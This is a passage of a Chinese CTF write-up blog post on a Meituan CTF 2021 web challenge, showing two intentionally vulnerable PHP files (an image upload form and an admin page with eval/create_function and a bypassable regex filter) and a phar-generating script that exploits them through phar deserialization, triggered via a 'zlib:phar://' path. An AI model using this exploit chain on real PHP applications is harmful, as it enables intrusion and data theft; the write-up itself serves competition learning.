+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you don&#x27;t have permission&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome guest&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;图片库&lt;/h2&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">    &lt;p&gt;既然来了，就留下点什么吧(ಡωಡ)hiahiahia&lt;/p&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;guest.php&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;pic&quot;</span>&gt;文件名：&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;pic&quot;</span> id=<span class="string">&quot;pic&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;upload&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span> &gt; <span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;pic too long&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> != <span class="string">&#x27;image/jpeg&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/gif&#x27;</span> &amp;&amp; <span class="variable">$file_type</span> != <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file type error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ext</span> = end(explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$ext</span>,<span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;file ext error&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(is_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$upload_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> = <span class="string">&#x27;./uploads/&#x27;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = time().rand(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$user_path</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$user_path</span>.<span class="variable">$filename</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    session_start();</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = <span class="string">&#x27;readfile&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;flag = getenv(<span class="string">&#x27;ICQ_FLAG&#x27;</span>);</span><br><span class="line">            <span class="variable">$what_you_want</span> = <span class="keyword">$this</span>-&gt;flag;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;$flag&#x27;</span>.<span class="string">&#x27;= create_function(&quot;&quot;,\&#x27;echo &quot;&#x27;</span> . <span class="variable">$what_you_want</span> . <span class="string">&#x27;&quot;;\&#x27;);&#x27;</span>);</span><br><span class="line">            <span class="variable">$hint</span> = <span class="keyword">$this</span>-&gt;hint;</span><br><span class="line">            <span class="variable">$hint</span>(<span class="string">&#x27;hinttttttttttttttttttttttttttttttt.txt&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] !== <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;only admin can see flag&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;is_admin&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;welcome admin!!!&#x27;</span>;</span><br><span class="line">        <span class="comment">// $secret = new secret();</span></span><br><span class="line">        <span class="variable">$dir</span> = scandir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">0</span>]);<span class="keyword">unset</span>(<span class="variable">$dir</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$beautiful</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>];</span><br><span class="line">        <span class="variable">$flag_pic</span> = <span class="variable">$beautiful</span> ? <span class="variable">$beautiful</span>:<span class="variable">$dir</span>[array_rand(<span class="variable">$dir</span>,<span class="number">1</span>)];</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/^phar|smtp|compress|dict|zip|file|etc|root|filter|php|flag|ctf|hint|\.\.\//i&quot;</span>,<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">            chdir(<span class="string">&#x27;./uploads&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span>(readgzfile(<span class="variable">$flag_pic</span>))&#123;</span><br><span class="line">                copy(<span class="variable">$flag_pic</span>,<span class="string">&#x27;../lovestpic/lovest_&#x27;</span>.time().<span class="string">&#x27;.pic&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为代码中只有一个类，因此考虑利用这个类。代码中匿名函数的创建提供了利用点，因为匿名函数实际上有名称为 <code>%00lambda_\d</code> 的默认名称。因此只需要让 <code>$hint</code> 取到匿名函数的默认名称即可触发匿名函数读取到环境变量中的 flag。构造出如下脚本来生成 phar 载荷。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">MakePhar</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Phar</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">secret</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hint = urldecode(<span class="string">&quot;%00lambda_3&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MakePhar</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;EXP.phar&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;setMetadata(<span class="keyword">new</span> secret());</span><br><span class="line">        <span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;actuallyNothingHere&quot;</span>);</span><br><span class="line">        <span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将生成的载荷以 jpg 拓展名作为图片上传，然后 SSRF 到 <code>?username=admin&amp;password=admin&amp;jpg=zlib:phar://&#123;$filename&#125;</code> 触发文件的解压即可触发到 phar 反序列化从而得到 flag。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql"><span class="toc-number">1.</span> <span class="toc-text">sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easytricks"><span class="toc-number">2.</span> <span class="toc-text">easytricks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xx-elogin"><span class="toc-number">3.</span> <span class="toc-text">xx_elogin</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&text=[Pending]美团 CTF 2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&is_video=false&description=[Pending]美团 CTF 2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[Pending]美团 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-CN/posts/f43e78a1.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&title=[Pending]美团 CTF 2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&name=[Pending]美团 CTF 2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-CN/posts/f43e78a1.html&t=[Pending]美团 CTF 2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="#">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="/zh-TW">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    
+      <a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/">湘ICP备20002800号</a>
+    
+    
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="/images/beian.png"/>
+      <a href= "http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=43021102000188">湘公网安备43021102000188号</a>
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 2,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(i){i.imageLazyLoadSetting.processImages=a;var n=i.imageLazyLoadSetting.isSPA,o=i.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function a(){n&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,e,a=0;a<r.length;a++)t=r[a],e=void 0,0<=(e=t.getBoundingClientRect()).bottom&&0<=e.left&&e.top<=(i.innerHeight*o||document.documentElement.clientHeight*o)&&function(){var t,e,i,n,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},i=new Image,n=t.getAttribute("data-original"),i.onload=function(){t.src=n,e&&e()},t.src!==n&&(i.src=n)}()}a(),i.addEventListener("scroll",function(){var t,e;t=a,e=i,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body>
+</html>
